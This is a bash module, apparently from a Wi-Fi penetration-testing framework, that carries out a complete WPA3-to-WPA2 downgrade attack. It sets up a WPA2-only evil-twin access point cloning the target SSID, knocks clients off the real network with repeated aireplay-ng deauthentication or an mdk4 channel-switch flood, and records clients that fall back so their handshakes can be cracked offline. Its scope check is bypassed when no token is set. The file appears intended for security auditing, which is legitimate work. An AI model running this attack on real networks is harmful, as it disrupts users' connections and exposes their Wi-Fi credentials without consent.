#!/usr/bin/env bash
# MODULE_META
# NAME="WPA3-to-WPA2 Active Downgrade"
# CATEGORY="D"
# DEPS="A1"
# CRITICAL="no"
# TOOLS="hostapd,mdk4,aireplay-ng"
# DESC="Attempt to force WPA3-SAE clients to downgrade to WPA2-PSK"
# REQS="managed_iface,target_ssid,nat"
# PCAP="yes"
# TIMED="yes"
# PROMPTS="roaming_catalyst"
# DECODE="wpa3"

#===============================================================================
#  modules/d7_wpa3_downgrade_active.sh
#  D7: WPA3-to-WPA2 Active Downgrade (Golden Wrapper)
#
#  METHODOLOGY (SPEC ALIGNED):
#  1. Deploy a WPA2-only Evil Twin with the target SSID.
#  2. Interactive selection: Force roaming via Deauth or CSA (mdk4).
#  3. Capture the downgraded client's WPA2 handshake.
#===============================================================================

set -euo pipefail

# Inputs from Environment

CATALYST="${CATALYST:-1}"
SSID="${GUEST_SSID:-}"
TARGET_BSSID="${GUEST_BSSID:-}"
CHANNEL="${GUEST_CHANNEL:-11}" # Default to 11 if not set
SCAN_TIME="${SCAN_TIME:-60}"
SESSION_DIR="${SESSION_DIR:-.}"
EVIDENCE_DIR="${SESSION_EVIDENCE_DIR:-${SESSION_DIR}/evidence}"
ASTRA_BIN="${ASTRA_BIN:-wifi-astra}"
TC_ID="D7"

# Dual/single adapter setup — hostapd requires a managed-mode interface.
_AP_IFACE="${AP_INTERFACE:-}"
_RAW_IFACE="${WIFI_INTERFACE:-${MONITOR_INTERFACE:-}}"
if [[ "$_RAW_IFACE" == *mon ]]; then
    _PHYS_IFACE="${_RAW_IFACE%mon}"
else
    _PHYS_IFACE="$_RAW_IFACE"
fi
# --- Scope Guardrail ---
# Verify this module was launched by the wifi-astra controller.
# Prevents casual direct invocation against unauthorized targets.
if [[ -n "${ASTRA_SCOPE_TOKEN:-}" && -n "${GUEST_BSSID:-}" ]]; then
    if ! "$ASTRA_BIN" verify-scope \
            --session-dir "$SESSION_DIR" \
            --tc "$TC_ID" \
            --bssid "$GUEST_BSSID" \
            --token "$ASTRA_SCOPE_TOKEN"; then
        echo "[!] Scope guardrail failed — aborting." >&2
        exit 1
    fi
fi
# (Token absent = headless or legacy mode; guard is skipped but logged)
if [[ -z "${ASTRA_SCOPE_TOKEN:-}" && "${ASTRA_HEADLESS:-}" != "true" ]]; then
    echo "[!] WARNING: ASTRA_SCOPE_TOKEN not set. Run this module via wifi-astra start." >&2
fi
# --- End Scope Guardrail ---

if [[ -z "$SSID" ]]; then
    echo "[!] GUEST_SSID not set."
    exit 1
fi

# Register cleanup trap BEFORE adapter manipulation so interface is always restored.
cleanup() {
    echo "[*] Cleaning up Downgrade processes..."
    [[ -n "${HOSTAPD_PID:-}" ]] && kill "$HOSTAPD_PID" 2>/dev/null || true
    [[ -n "${CATALYST_PID:-}" ]] && kill "$CATALYST_PID" 2>/dev/null || true
    [[ -n "${TELEMETRY_PID:-}" ]] && kill "$TELEMETRY_PID" 2>/dev/null || true
    if [[ -z "${_AP_IFACE:-}" && -n "${_PHYS_IFACE:-}" ]]; then
        airmon-ng start "$_PHYS_IFACE" > /dev/null 2>&1 || {
            ip link set "$_PHYS_IFACE" down 2>/dev/null || true
            iw dev "$_PHYS_IFACE" set type monitor 2>/dev/null || true
            ip link set "$_PHYS_IFACE" up 2>/dev/null || true
        }
    fi
}
trap cleanup EXIT

# Determine hostapd interface (must be managed mode).
if [[ -n "$_AP_IFACE" ]]; then
    # Dual-adapter mode: AP card stays managed; MONITOR_INTERFACE available for catalyst.
    HOSTAPD_IFACE="$_AP_IFACE"
else
    # Single-adapter degraded mode: toggle physical card to managed.
    if [[ -z "$_PHYS_IFACE" ]]; then
        echo "[!] Cannot derive physical interface. Set AP_INTERFACE or ensure WIFI_INTERFACE is set."
        exit 1
    fi
    echo "[*] Restoring ${_PHYS_IFACE} to managed mode for Evil Twin operation..."
    airmon-ng stop "${MONITOR_INTERFACE:-}" > /dev/null 2>&1 || true
    ip link set "$_PHYS_IFACE" down 2>/dev/null || true
    iw dev "$_PHYS_IFACE" set type managed 2>/dev/null || true
    ip link set "$_PHYS_IFACE" up 2>/dev/null || true
    sleep 1
    HOSTAPD_IFACE="$_PHYS_IFACE"
fi

# Injection interface for deauth/CSA catalyst (only usable in dual-adapter mode).
MON_IFACE="${MONITOR_INTERFACE:-}"

echo "[*] Initializing WPA3 Downgrade tactical options..."

# 1. Interactive Selection
echo "[?] Select Roaming Catalyst:"
echo "    1) Targeted Deauth (Surgical - Disrupts PMF)"
echo "    2) CSA (Channel Switch Announcement via mdk4 - Stealthier)"
catalyst_choice="${CATALYST:-1}"

# 2. Deploy WPA2-only Evil Twin
echo "[*] Deploying WPA2-PSK Evil Twin for SSID: $SSID on ${HOSTAPD_IFACE}..."
HOSTAPD_CONF="${EVIDENCE_DIR}/${TC_ID}_hostapd.conf"
HOSTAPD_LOG="${EVIDENCE_DIR}/${TC_ID}_hostapd.log"

cat <<EOF > "$HOSTAPD_CONF"
interface=$HOSTAPD_IFACE
driver=nl80211
ssid=$SSID
hw_mode=g
channel=$CHANNEL
auth_algs=1
wpa=2
wpa_key_mgmt=WPA-PSK
wpa_pairwise=TKIP CCMP
rsn_pairwise=CCMP
wpa_passphrase=DowngradeTest123
EOF

# 3. Start dynamic telemetry heartbeat
(
    HEARTBEAT_ELAPSED=0
    while [[ "${ASTRA_INDEFINITE:-}" == "true" || $HEARTBEAT_ELAPSED -lt $SCAN_TIME ]]; do
        if [[ "${ASTRA_INDEFINITE:-}" == "true" ]]; then
            "$ASTRA_BIN" record-progress --session-dir "$SESSION_DIR" --tc "$TC_ID" --percent 50 --status "WPA3 downgrade active — ${HEARTBEAT_ELAPSED}s elapsed (Ctrl+C to stop)"
            sleep 5
            HEARTBEAT_ELAPSED=$((HEARTBEAT_ELAPSED + 5))
            continue
        fi
        PCT=$(( 10 + (HEARTBEAT_ELAPSED * 80 / SCAN_TIME) ))
        [[ $PCT -gt 90 ]] && PCT=90
        "$ASTRA_BIN" record-progress --session-dir "$SESSION_DIR" --tc "$TC_ID" --percent "$PCT" --status "Executing attack..."
        sleep 2
        HEARTBEAT_ELAPSED=$((HEARTBEAT_ELAPSED + 2))
    done
) &
TELEMETRY_PID=$!

# 4. Execution of Catalyst and hostapd
# Injection for deauth/CSA requires a monitor-mode interface.
# In single-adapter degraded mode the card is now in managed mode — skip catalyst.
if [[ -z "$_AP_IFACE" && "$catalyst_choice" != "0" ]]; then
    echo "[!] Catalyst skipped — monitor interface unavailable in single-adapter degraded mode."
    echo "    Connect a second adapter and assign it as the AP adapter for simultaneous injection."
fi

if [[ "${ASTRA_IN_WINDOW:-}" == "true" ]]; then
    # Window Mode: Run hostapd in foreground, catalyst in background
    if [[ -n "$_AP_IFACE" && "$catalyst_choice" == "1" ]] && [[ -n "$TARGET_BSSID" && -n "$MON_IFACE" ]]; then
        echo "[*] Starting deauth catalyst against WPA3 BSSID: $TARGET_BSSID..."
        ( while true; do aireplay-ng --deauth 5 -a "$TARGET_BSSID" "$MON_IFACE" || true; sleep 15; done ) &
        CATALYST_PID=$!
    elif [[ -n "$_AP_IFACE" && "$catalyst_choice" == "2" ]] && [[ -n "$MON_IFACE" ]] && command -v mdk4 &>/dev/null; then
        echo "[*] Starting CSA catalyst (mdk4) for $SSID..."
        timeout --foreground "$SCAN_TIME" mdk4 "$MON_IFACE" b -n "$SSID" -c 11 &
        CATALYST_PID=$!
    fi

    echo "[*] Downgrade environment active. Monitoring for client association..."
    timeout --foreground "$SCAN_TIME" hostapd "$HOSTAPD_CONF" 2>&1 | tee "$HOSTAPD_LOG" || true
else
    # Background Mode
    hostapd "$HOSTAPD_CONF" > "$HOSTAPD_LOG" 2>&1 &
    HOSTAPD_PID=$!

    if [[ -n "$_AP_IFACE" && "$catalyst_choice" == "1" ]] && [[ -n "$TARGET_BSSID" && -n "$MON_IFACE" ]]; then
        echo "[*] Starting deauth catalyst against WPA3 BSSID: $TARGET_BSSID..."
        ( while kill -0 "$HOSTAPD_PID" 2>/dev/null; do aireplay-ng --deauth 5 -a "$TARGET_BSSID" "$MON_IFACE" > /dev/null 2>&1 || true; sleep 15; done ) &
        CATALYST_PID=$!
    elif [[ -n "$_AP_IFACE" && "$catalyst_choice" == "2" ]] && [[ -n "$MON_IFACE" ]] && command -v mdk4 &>/dev/null; then
        echo "[*] Starting CSA catalyst (mdk4) for $SSID..."
        mdk4 "$MON_IFACE" b -n "$SSID" -c 11 > /dev/null 2>&1 &
        CATALYST_PID=$!
    fi

    echo "[*] Downgrade environment active. Monitoring for client association..."
    sleep "$SCAN_TIME"
fi

kill "$TELEMETRY_PID" 2>/dev/null || true

# 4. Reporting
if grep -qi "authenticated" "$HOSTAPD_LOG"; then
    V_MAC=$(grep -i "authenticated" "$HOSTAPD_LOG" | awk '{print $3}' | head -1)
    echo "[!] SUCCESS: WPA3 CLIENT DOWNGRADED TO WPA2!"
    "$ASTRA_BIN" record-finding \
        --session-dir "$SESSION_DIR" \
        --tc "$TC_ID" \
        --type vulnerability \
        --name "WPA3 Downgrade Successful" \
        --severity HIGH \
        --desc "A WPA3-capable client ($V_MAC) successfully associated with the WPA2 Evil Twin AP." \
        --target "$V_MAC" \
        --evidence "$HOSTAPD_LOG" \
        --rationale "WPA3 transition mode vulnerability allows an attacker to force clients into a weaker WPA2-PSK handshake which can then be captured and cracked offline."
else
    echo "[+] Downgrade test complete. No client fallback detected."
    "$ASTRA_BIN" record-finding \
        --session-dir "$SESSION_DIR" \
        --tc "$TC_ID" \
        --type vulnerability \
        --name "[D7] Audit Complete" \
        --severity INFO \
        --desc "Attempted protocol downgrade attack on $SSID. No clients associated with the legacy AP." \
        --target "$SSID" \
        --evidence "$HOSTAPD_LOG" \
        --rationale "Modern OSes may resist protocol downgrades if they have previously associated with the SSID using SAE (WPA3) and have cached that state."
fi

"$ASTRA_BIN" record-progress --session-dir "$SESSION_DIR" --tc "$TC_ID" --percent 100 --status "Mission Complete"

# Hold window if in tactical mode so user can see final output/errors
if [[ "${ASTRA_IN_WINDOW:-}" == "true" ]]; then
    echo -e "\n${ASTRA_COLOR_BOLD:-}[*] Mission Complete. Window will close in 5s...${ASTRA_COLOR_RESET:-}"
    sleep 5
fi

exit 0
